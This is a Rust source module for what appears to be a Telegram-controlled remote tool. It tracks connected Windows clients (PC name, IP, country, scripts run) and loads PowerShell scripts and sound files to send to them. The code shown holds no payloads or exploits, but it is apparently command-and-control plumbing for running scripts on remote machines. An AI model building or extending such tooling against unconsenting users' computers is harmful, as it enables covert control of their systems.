pub mod app {
    use std::collections::HashMap;
    use std::ffi::OsStr;
    use std::fs;
    use std::net::SocketAddr;

    use chrono::{DateTime, Local};
    use log::{error, info, warn};
    use serde::{Deserialize};
    use teloxide::Bot;
    use tokio::sync::mpsc::Sender;
    use uuid::Uuid;
    use crate::config::config::Config;
    use crate::core::command::command::RPTCommand;

    pub const SCRIPTS_PATH: &str = "scripts/";
    const SCRIPT_DECLARATION: &str = "declaration.json";

    #[derive(Clone, Debug)]
    #[derive(Default)]
    pub struct RPTClient {
        pub id: String,
        pub address: String,
        pub pc_name: String,
        pub connected: DateTime<Local>,
        pub win: String,
        pub country: String,
        pub cc: String,
        pub runned_scripts: Vec<String>,
        pub channel: Option<Sender<RPTCommand>>,
    }

    #[derive(Deserialize, Clone)]
    pub struct HelloData {
        pub pc_name: String,
        pub win: String,
        pub ip: String,
        pub country: String,
        pub cc: String,
    }

    impl RPTClient {
        pub fn new(data: HelloData) -> RPTClient {
            RPTClient {
                id: Uuid::new_v4().to_string(),
                address: data.ip,
                pc_name: data.pc_name,
                connected: Local::now(),
                win: data.win,
                country: data.country,
                cc: data.cc,
                runned_scripts: vec![],
                channel: None
            }
        }
    }

    #[derive(Debug, Clone, Deserialize)]
    pub struct RPTScript {
        pub name: String,
        pub description: String,
    }

    #[derive(Clone)]
    pub struct AppState {
        pub bot: Bot,
        pub config: Config,
        pub clients: Vec<RPTClient>,
        pub scripts: Option<HashMap<String, RPTScript>>,
        pub sounds: HashMap<i32, String>,
    }

    impl AppState {
        pub fn new(bot: Bot, config: Config) -> AppState {
            AppState {
                bot,
                config,
                clients: vec![],
                scripts: None,
                sounds: HashMap::new(),
            }
        }
        pub fn load_scripts(&mut self) {
            info!("Loading scripts...");
            let declaration_json = match fs::read_to_string(format!("{}{}", SCRIPTS_PATH, SCRIPT_DECLARATION)) {
                Ok(declaration_json) => declaration_json,
                Err(e) => {
                    error!("failed to read declaration.json. Error: {}", e);
                    return
                }
            };
            let mut scripts_declared: HashMap<String, RPTScript> = serde_json::from_str(&*declaration_json).map_err(|e| error!("{}", e)).expect("Failed to read json");
            scripts_declared.retain(|path, _script_obj| {
                let exists = fs::exists(format!("{}{}.ps1", SCRIPTS_PATH, path)).unwrap_or(false);
                if !exists {
                    error!("Script not found: {}", path);
                }

                exists
            });

            self.scripts = Some(scripts_declared);
            info!("Loaded scripts: {}", &self.scripts.clone().unwrap_or(HashMap::new()).len());
        }

        pub fn load_sounds(&mut self) {
            info!("Loading sounds... ");
            let paths = fs::read_dir("sounds/").expect("cannot find sounds folder");
            let mut index = 1;
            for entry in paths {
                let entry = entry.expect("failed");
                let path = entry.path();
                if path.is_file() {
                    let extension = path.extension()
                        .and_then(OsStr::to_str)
                        .unwrap_or("");

                    match extension {
                        "mp3" | "wav" | "ogg" => {
                            let filename = path.file_name()
                                .unwrap()
                                .to_str()
                                .expect("")
                                .to_string();
                            self.sounds.insert(index, filename);
                            index += 1;
                        }
                        _ => {
                            warn!("Unknown audio format: {:?}", path);
                        }
                    }
                }
            }

            info!("Loaded sounds: {}", index-1);
        }
    }
}